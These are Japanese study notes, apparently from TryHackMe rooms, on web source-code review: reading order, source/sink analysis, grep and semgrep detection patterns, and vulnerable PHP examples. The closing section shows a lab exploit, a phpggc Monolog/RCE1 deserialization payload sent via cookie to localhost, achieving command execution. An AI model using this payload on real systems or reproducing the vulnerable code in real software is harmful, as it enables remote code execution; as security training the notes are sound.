# Webコードレビュー

https://tryhackme.com/room/webframeworkscodereview

https://tryhackme.com/room/sourcecodereviewsphp

## 基礎

### 読む順番

| ステップ | 何を読むべきか | それが私たちに教えてくれること |
|---------|----------------|--------------------------------|
| 1 | READMEとドキュメント | アプリの機能、実行方法、使用されているフレームワーク |
| 2 | 依存関係マニフェスト | ライブラリとバージョン、サードパーティの攻撃対象領域 |
| 3 | 設定ファイル | デバッグフラグ、シークレット、データベース文字列 |
| 4 | 経路／入口 | 侵入経路の全リスト、攻撃対象領域マップ |
| 5 | 認証ミドルウェアとデコレーター | どのルートが保護されているか、どのルートが保護されていないか |
| 6 | データベース/モデル層 | データの保存場所とクエリの構築方法 |
| 7 | 個別のルートハンドラー | 各エントリーポイントの背後にあるロジック |

### source と sink

- source はユーザーが制御するデータがアプリケーションに入力される場所。
- sink は攻撃者からの入力が与えられた際に危険となるあらゆる操作。
- sink単体ではバグではない。sourceからsinkへ到達する経路に安全なステップが存在しないsinkはバグである。

## 検索

### grep

```sh
grep -rn --include="*.py" -E "os\.system|subprocess|eval\(|exec\(|pickle\.loads|render_template_string|cursor\.execute|send_file|open\(" .

grep -rnE "(SECRET|KEY|TOKEN|PASSWORD|API_KEY)\s*=\s*['\"]" --include="*.py" .

grep -rnE "DEBUG\s*=\s*True|TESTING\s*=\s*True|verify\s*=\s*False" .

grep -rE "AKIA[0-9A-Z]{16}" .

```

### [semgrep](https://github.com/semgrep/semgrep)

構文解析を活用してバグやセキュリティの脆弱性を検出する高速でオープンソースの静的解析ツール

```sh
pip install semgrep

# インターネット接続が必要
semgrep --config p/owasp-top-ten .

# ローカルのルールファイルを指定
semgrep --config /opt/review/semgrep-rules .
```

### ripgrep

RUSTで超高速。.gitignore を尊重し、バイナリや隠しファイルを自動的に除外する。

```sh
rg -n "system\(|exec\(|shell_exec\(|passthru\(|popen\(|proc_open\(" .
```

#### カスタムルール

```yaml
rules:
  - id: render-template-string-usage
    pattern: render_template_string(...)
    message: render_template_string on possible user input, check for SSTI
    severity: WARNING
    languages: [python]
```

## フレームワークの着目点

- 認証と認可が設定されていないルートがないか
- ORMを介さない生のSQL実行がないか
- CSRF保護が有効になっているか
- デバッグが有効になっていないか
- マスアサインメント保護されているか
- 依存関係の脆弱性ツールを使う

## PHP

PHP7 以前と PHP8 以降で動作が大きく異なる点は留意が必要。

### 緩やかな比較

**完全一致を目的とする場合は常に `===` を使用する。**

`0e`から始まるハッシュは科学的記数法として扱われるため、浮動小数点0と評価される。  

```php
// app/Support/License.php
public function verify(string $provided): bool
{
    $expected = $this->storedHash();   // a stored hash, e.g. "0e462097431906509019562988736854"
    return $provided == $expected;     // loose comparison
}
```

### extract

`?isAdmin=1` でリクエストする。

```php
// app/Http/Controllers/AccountController.php
$isAdmin = false;
extract($_REQUEST);
if ($isAdmin) {
    // privileged branch
}
```

### 弱いランダム性

rand, uniqid は予測可能。`bin2hex(random_bytes(32))` などは安全。

```php
// app/Http/Controllers/AccountController.php
$token = md5(uniqid(mt_rand(), true));
```

### マジックメソッドとデシリアライズ

ユーザー入力によってTempFileがデシリアライズされるとき、任意のファイルが削除される。

```php
class TempFile {
    public $path;
    public function __destruct() {
        unlink($this->path);
    }
}
```

### phpggc

この脆弱性があるとする。

```php
// app/Http/Middleware/LoadPreferences.php  (true positive)
public function handle($request, Closure $next)
{
    if (isset($_COOKIE['prefs'])) {
        $prefs = unserialize($_COOKIE['prefs']);
        // preferences applied to the request
    }
    return $next($request);
}
```

ガジェットチェーンを構築。Monolog ロギングライブラリが使われているとする。

```sh
phpggc -l | grep -i monolog
```

```sh
ubuntu@scr-php:~$ PAYLOAD=$(phpggc -u Monolog/RCE1 system 'id')
curl -s "http://localhost:8080/" -H "Cookie: prefs=$PAYLOAD" | grep uid
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
